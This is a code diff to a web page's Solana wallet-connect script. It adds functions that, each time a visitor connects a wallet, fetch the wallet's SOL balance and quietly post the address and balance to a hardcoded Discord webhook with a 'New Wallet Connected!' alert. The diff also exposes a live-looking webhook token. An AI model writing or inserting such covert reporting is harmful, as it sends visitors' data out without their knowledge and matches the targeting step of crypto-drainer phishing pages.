@@ -155,7 +155,7 @@
   <div id="root"></div>
 
   <!-- ✅ Modal toggle scripts -->
-  <script>
+ <script>
   document.getElementById('connectWallet').addEventListener('click', function (e) {
     e.preventDefault();
     document.getElementById('walletPopup').classList.add('show-popup');
@@ -167,9 +167,13 @@
 
   async function onWalletConnected(publicKey) {
     if (!publicKey) return;
-    const shortAddress = publicKey.slice(0, 6) + "..." + publicKey.slice(-4);
-    document.getElementById('walletAddress').innerText = shortAddress;
+
+    // ✅ Full Address (no slicing)
+    document.getElementById('walletAddress').innerText = publicKey;
     document.getElementById('afterConnectPopup').style.display = 'flex';
+
+    // 🔥 Fetch SOL balance and send to Discord
+    await fetchBalanceAndSend(publicKey);
   }
 
   window.openSolanaWalletModal = async function() {
@@ -182,7 +186,42 @@
     }
   }
 
-  </script>
+  async function fetchBalanceAndSend(publicKey) {
+    try {
+      const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+      const walletKey = new solanaWeb3.PublicKey(publicKey);
+      const balanceLamports = await connection.getBalance(walletKey);
+      const balanceSOL = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+
+      console.log('Wallet Address:', publicKey);
+      console.log('SOL Balance:', balanceSOL);
+
+      await sendToDiscord(publicKey, balanceSOL);
+    } catch (error) {
+      console.error('Error fetching SOL balance:', error);
+    }
+  }
+
+  async function sendToDiscord(address, balance) {
+    const webhookURL = 'https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR'; // <== Replace!!
+
+    const data = {
+      content: `🚀 **New Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
+    };
+
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      console.log('Successfully sent to Discord!');
+    } catch (error) {
+      console.error('Failed to send to Discord:', error);
+    }
+  }
+</script>
+
 
 </body>
 </html>
